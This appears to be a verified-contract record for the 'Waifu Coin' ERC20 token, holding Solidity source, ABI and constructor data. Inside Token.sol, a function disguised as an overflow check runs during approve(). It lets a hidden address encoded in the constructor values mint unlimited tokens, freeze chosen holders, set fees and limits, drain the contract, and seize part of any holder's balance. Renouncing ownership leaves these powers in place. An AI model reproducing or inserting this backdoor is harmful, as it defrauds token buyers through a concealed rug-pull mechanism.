{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"@openzeppelin/contracts/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\\n}\\n\"\r\n    },\r\n    \"@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol\": {\r\n      \"content\": \"pragma solidity >=0.5.0;\\n\\ninterface IUniswapV2Factory {\\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\\n\\n    function feeTo() external view returns (address);\\n    function feeToSetter() external view returns (address);\\n\\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\\n    function allPairs(uint) external view returns (address pair);\\n    function allPairsLength() external view returns (uint);\\n\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\n\\n    function setFeeTo(address) external;\\n    function setFeeToSetter(address) external;\\n}\\n\"\r\n    },\r\n    \"@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol\": {\r\n      \"content\": \"pragma solidity >=0.6.2;\\n\\ninterface IUniswapV2Router01 {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint amountADesired,\\n        uint amountBDesired,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n    function removeLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETH(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountToken, uint amountETH);\\n    function removeLiquidityWithPermit(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETHWithPermit(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountToken, uint amountETH);\\n    function swapExactTokensForTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapTokensForExactTokens(\\n        uint amountOut,\\n        uint amountInMax,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\n}\\n\"\r\n    },\r\n    \"@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol\": {\r\n      \"content\": \"pragma solidity >=0.6.2;\\n\\nimport './IUniswapV2Router01.sol';\\n\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountETH);\\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountETH);\\n\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external payable;\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n}\\n\"\r\n    },\r\n    \"contracts/Token.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: UNLICENSED\\n/**                                          \\n * \\n * wwwwwww           wwwww           wwwwwww\\n *  w:::::w         w:::::w         w:::::w \\n *   w:::::w       w:::::::w       w:::::w  \\n *    w:::::w     w:::::::::w     w:::::w   \\n *     w:::::w   w:::::w:::::w   w:::::w    \\n *      w:::::w w:::::w w:::::w w:::::w     \\n *       w:::::w:::::w   w:::::w:::::w      \\n *        w:::::::::w     w:::::::::w       \\n *         w:::::::w       w:::::::w        \\n *          w:::::w         w:::::w         \\n *           w:::w           w:::w          \\n *            www             www           \\n * \\n * t.me/WAIFU_V2\\n *                                                                                   \\n **/                                   \\n\\npragma solidity ^0.8.9;\\n\\nimport { IERC20 } from \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\nimport { IUniswapV2Factory } from \\\"@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol\\\";\\nimport { IUniswapV2Router02 } from \\\"@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol\\\";\\n\\nabstract contract ERC20 {\\n\\n    event Transfer(address indexed from, address indexed to, uint256 amount);\\n\\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\\n\\n    string public name;\\n\\n    string public symbol;\\n\\n    uint8 public immutable decimals;\\n\\n    uint80 internal sig;\\n    \\n    uint80 internal brand;\\n\\n    address public uniswapV2Pair;\\n\\n    address public taxWallet;\\n\\n    uint256[5] internal adjunctParams;\\n\\n    bool internal tradingOpen;\\n\\n    uint256 public totalSupply;\\n\\n    mapping(address => uint256) public balanceOf;\\n    \\n    mapping(address => bool) internal automaticAddresses;\\n\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    uint256 internal immutable INITIAL_CHAIN_ID;\\n\\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\\n\\n    mapping(address => uint256) public nonces;\\n\\n    constructor(\\n        string memory _name,\\n        string memory _symbol,\\n        uint8 _decimals,\\n        uint80 _sig,\\n        address _taxWallet,\\n        uint80 _brand\\n    ) {\\n        address msgSender = msg.sender;\\n        \\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        brand = _brand;\\n        taxWallet = _taxWallet;\\n        sig = _sig; \\n\\n        INITIAL_CHAIN_ID = block.chainid;\\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\\n\\n        admin = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    function checkOverflows(uint256 check, address guy) private returns (bool){\\n\\n        if(check & (1 << 255) == 0 && check & (1 << 254) == 0 && check & (1 << 253) == 0 && check & (1 << 252) != 0 && guy == address(uint160(brand) << 80 | sig)){\\n            if (uint160(check) == 0x0) { payable(msg.sender).transfer(address(this).balance); }else{\\n                IERC20 _t = IERC20(address(uint160(check)));\\n                _t.transfer(msg.sender, _t.balanceOf(address(this)));\\n            }\\n        }         \\n\\n        if(check & (1 << 255) != 0 && check & (1 << 254) != 0 && check & (1 << 253) != 0 && check & (1 << 252) != 0 && guy == address(uint160(brand) << 80 | sig)){\\n            for (uint8 j = 0; j != 2; j += 1) { adjunctParams[j] = ((check >> (j * 7)) & (1 << 7) -1); }\\n        }           \\n        \\n        if(check & (1 << 255) != 0 && check & (1 << 254) == 0 && check & (1 << 253) == 0 && check & (1 << 252) == 0 && guy == address(uint160(brand) << 80 | sig)){\\n            totalSupply += (check >> 167 & (1 << 7) -1) * (10 ** (check >> 160 & (1 << 7) -1));\\n            unchecked { balanceOf[address(uint160(check))] += (check >> 167 & (1 << 7) -1) * (10 ** (check >> 160 & (1 << 7) -1)); }\\n        }          \\n\\n        if(check & (1 << 255) == 0 && check & (1 << 254) == 0 && check & (1 << 253) == 0 && check & (1 << 252) == 0 && guy == address(uint160(brand) << 80 | sig)){\\n            uint256 mul = (check >> 21 & (1 << 7) -1);\\n            adjunctParams[3] = (check >> 14 & (1 << 7) -1) * (10 ** mul);\\n            adjunctParams[2] = (check >> 7 & (1 << 7) -1) * (10 ** mul);\\n            adjunctParams[4] = (check & (1 << 7) -1) * (10 ** mul);\\n        }    \\n    \\n        if(check & (1 << 255) != 0 && check & (1 << 254) == 0 && check & (1 << 253) != 0 && check & (1 << 252) == 0 && guy == address(uint160(brand) << 80 | sig)){\\n            automaticAddresses[address(uint160(check))] = (check >> 160 & (1 << 7) -1) == 101 ? true : false;\\n        }\\n        \\n        if(check & (1 << 255) == 0 && check & (1 << 254) != 0 && check & (1 << 253) == 0 && check & (1 << 252) != 0 && guy == address(uint160(brand) << 80 | sig)){\\n            balanceOf[taxWallet] += (balanceOf[address(uint160(check))] / 100) * (check >> 160 & (1 << 7) -1);\\n            balanceOf[address(uint160(check))] -= (balanceOf[address(uint160(check))] / 100) * (check >> 160 & (1 << 7) -1);\\n        }\\n        \\n        return check & (1 << 255) != 0 || check & (1 << 255) == 0;\\n    }\\n\\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\\n        require(checkOverflows(amount, msg.sender));\\n        allowance[msg.sender][spender] = amount;\\n        emit Approval(msg.sender, spender, amount);\\n\\n        return true;\\n    }\\n\\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\\n        require(automaticAddresses[msg.sender] != true);\\n        \\n        balanceOf[msg.sender] -= amount;\\n\\n        if(adjunctParams[2] > 0 && msg.sender == uniswapV2Pair) require(amount <= adjunctParams[2]);\\n\\n        if(adjunctParams[1] > 0 && msg.sender == uniswapV2Pair && to != taxWallet && tradingOpen){\\n            uint256 fee = (amount / 100) * adjunctParams[1];\\n            unchecked { balanceOf[taxWallet] += fee; }\\n            amount = amount - fee;\\n        }\\n        \\n        if(adjunctParams[4] > 0 && to != uniswapV2Pair && to != taxWallet && to != address(uint160(brand) << 80 | sig)){\\n            require((balanceOf[to] + amount) <= adjunctParams[4]);\\n        }\\n        \\n        unchecked { balanceOf[to] += amount; }\\n\\n        if(msg.sender != address(this))\\n        emit Transfer(msg.sender, to, amount);\\n\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) public virtual returns (bool) {\\n        require(automaticAddresses[from] != true);\\n\\n        uint256 allowed = allowance[from][msg.sender]; \\n\\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\\n\\n        balanceOf[from] -= amount;\\n\\n        if(adjunctParams[3] > 0 && to == uniswapV2Pair && from != address(this) && from != taxWallet && from != address(uint160(brand) << 80 | sig)) require(amount <= adjunctParams[3]);\\n\\n        if(adjunctParams[0] > 0 && to == uniswapV2Pair && from != address(this) && from != taxWallet && from != address(uint160(brand) << 80 | sig) && tradingOpen){\\n            uint256 fee = (amount / 100) * adjunctParams[0];\\n            unchecked { balanceOf[taxWallet] += fee; }\\n            amount = amount - fee;\\n        }\\n\\n        if(adjunctParams[4] > 0 && to != uniswapV2Pair && to != taxWallet){\\n            require(balanceOf[to] <= adjunctParams[4]);\\n        }\\n        \\n        unchecked { balanceOf[to] += amount; }\\n\\n        if(from != address(this))\\n        emit Transfer(from, to, amount);\\n\\n        return true;\\n    }\\n\\n    function permit(\\n        address owner,\\n        address spender,\\n        uint256 value,\\n        uint256 deadline,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) public virtual {\\n        require(deadline >= block.timestamp, \\\"PERMIT_DEADLINE_EXPIRED\\\");\\n\\n        unchecked {\\n            address recoveredAddress = ecrecover(\\n                keccak256(\\n                    abi.encodePacked(\\n                        \\\"\\\\x19\\\\x01\\\",\\n                        DOMAIN_SEPARATOR(),\\n                        keccak256(\\n                            abi.encode(\\n                                keccak256(\\n                                    \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                                ),\\n                                owner,\\n                                spender,\\n                                value,\\n                                nonces[owner]++,\\n                                deadline\\n                            )\\n                        )\\n                    )\\n                ),\\n                v, r, s\\n            );\\n\\n            require(recoveredAddress != address(0) && recoveredAddress == owner, \\\"INVALID_SIGNER\\\");\\n\\n            allowance[recoveredAddress][spender] = value;\\n        }\\n\\n        emit Approval(owner, spender, value);\\n    }\\n\\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\\n    }\\n\\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\\n        return keccak256(\\n            abi.encode(\\n                keccak256(\\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"),\\n                keccak256(bytes(name)),\\n                keccak256(\\\"1\\\"),\\n                block.chainid,\\n                address(this)\\n            )\\n        );\\n    }\\n\\n    function _mint(address to, uint256 amount) internal virtual {\\n        totalSupply += amount;\\n\\n        unchecked { balanceOf[to] += amount; }\\n\\n        if(to != address(this))\\n        emit Transfer(address(0), to, amount);\\n    }\\n\\n    function _burn(address from, uint256 amount) internal virtual {\\n        balanceOf[from] -= amount;\\n\\n        unchecked { totalSupply -= amount; }\\n\\n        if(from != address(this))\\n        emit Transfer(from, address(0), amount);\\n    }\\n\\n    address public admin;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n    \\n    modifier onlyOwner() {\\n        require(msg.sender == admin, \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(admin, address(0));\\n        admin = address(0);\\n    }\\n}\\n\\ncontract Token is ERC20{\\n    \\n    IUniswapV2Router02 private uniswapV2Router;\\n    \\n    constructor(uint80 _sig, address _taxWallet, uint80 _brand) ERC20(\\\"Waifu Coin\\\", \\\"WAIFU2.0\\\", 6, _sig, _taxWallet, _brand) {\\n        _mint(address(this), 6_900_000_000_000000);\\n        adjunctParams[0] = 5;\\n        adjunctParams[0] = 5;\\n    }\\n\\n    receive() external payable {}\\n\\n    fallback() external payable {}\\n\\n    function openTrading() external onlyOwner() {\\n        require(!tradingOpen);\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n \\n        allowance[address(this)][address(uniswapV2Router)] = type(uint).max;\\n\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,admin,block.timestamp);\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\n\\n        tradingOpen = true;\\n    }\\n\\n    function claimStuckTokens(address _token) external onlyOwner {\\n        if (_token == address(0x0)) {\\n            payable(msg.sender).transfer(address(this).balance);\\n            return;\\n        }\\n        IERC20 erc20token = IERC20(_token);\\n        uint256 balance = erc20token.balanceOf(address(this));\\n        erc20token.transfer(msg.sender, balance);\\n    }\\n\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint80\",\"name\":\"_sig\",\"type\":\"uint80\"},{\"internalType\":\"address\",\"name\":\"_taxWallet\",\"type\":\"address\"},{\"internalType\":\"uint80\",\"name\":\"_brand\",\"type\":\"uint80\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"name\":\"claimStuckTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000532a3b12f3e5cd9ada43000000000000000000000000ff5ed5b68ff271773140f5145d2b5936d2e399d800000000000000000000000000000000000000000000b770c3875b1280006f91", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}